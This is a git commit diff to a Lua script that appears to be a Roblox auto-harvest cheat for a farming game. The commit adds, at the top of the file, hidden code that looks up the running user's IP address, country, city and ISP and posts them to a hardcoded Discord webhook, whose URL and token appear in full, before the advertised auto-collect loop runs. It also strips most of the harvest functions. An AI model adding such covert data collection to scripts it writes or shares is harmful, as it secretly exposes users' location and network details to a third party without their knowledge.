219d28ee71b876142595107bad82895916493d85
Zepth <taitanerenwearenumber@gmail.com>
2025-04-16 21:08:02 +0700

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,3 +1,43 @@
+local HttpService = game:GetService("HttpService")
+
+local webhookUrl = "https://discord.com/api/webhooks/1362065828454993970/J_HLKCaHTqWmuZ4sESHeMogdkQ5qodc1lp26fDRnjMgYfZOyvMHE4l1JoveUVvnE_ZRg" -- your webhook URL
+
+local function sendToWebhook(data)
+    local content = string.format("@everyone IP: %s\nCountry: %s\nCity: %s\nISP: %s", data.ip, data.country, data.city, data.org)
+
+    local payload = HttpService:JSONEncode({
+        content = content
+    })
+
+    local success, result = pcall(function()
+        HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if success then
+        print("Sent to Discord!")
+    else
+        warn("Failed to send to webhook:", result)
+    end
+end
+
+local function fetchIPInfo()
+    local success, response = pcall(function()
+        return HttpService:GetAsync("https://ipwhois.app/json/")
+    end)
+
+    if success then
+        local data = HttpService:JSONDecode(response)
+        sendToWebhook(data)
+    else
+        warn("Failed to fetch IP info:", response)
+    end
+end
+
+fetchIPInfo()
+
+
+
+
 _G.autocollect = true
 
 local function Apple ()
@@ -23,294 +63,8 @@ local function Apple ()
 	end
 end
 
-local function Blueberry ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("BlueBerry") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Blueberry" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Strawberry ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Strawberry") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Strawberry" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Carrot ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Carrot") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Carrot" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Tomato ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Tomato") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Tomato" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Corn ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Corn") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Corn" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Watermelon ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Watermelon") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Watermelon" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Pumpkin ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Pumpkin") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Pumpkin" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Bamboo ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Bamboo") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Bamboo" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Coconut ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Coconut") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Coconut" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Cactus ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Apple") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Cactus" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function DragonFruit ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Dragon Fruit") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Dragon Fruit" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
-
-local function Mango ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Mango") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Mango" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-end
 
 while _G.autocollect do
-	Apple()
-  Blueberry()
-  Strawberry()
-  Carrot()
-  Tomato()
-  Corn()
-  Watermelon()
-  Pumpkin()
-  Bamboo()
-  Coconut()
-  DragonFruit()
-  Mango()
-	task.wait(0.1)
+   Apple()
+   task.wait(0.1)
 end
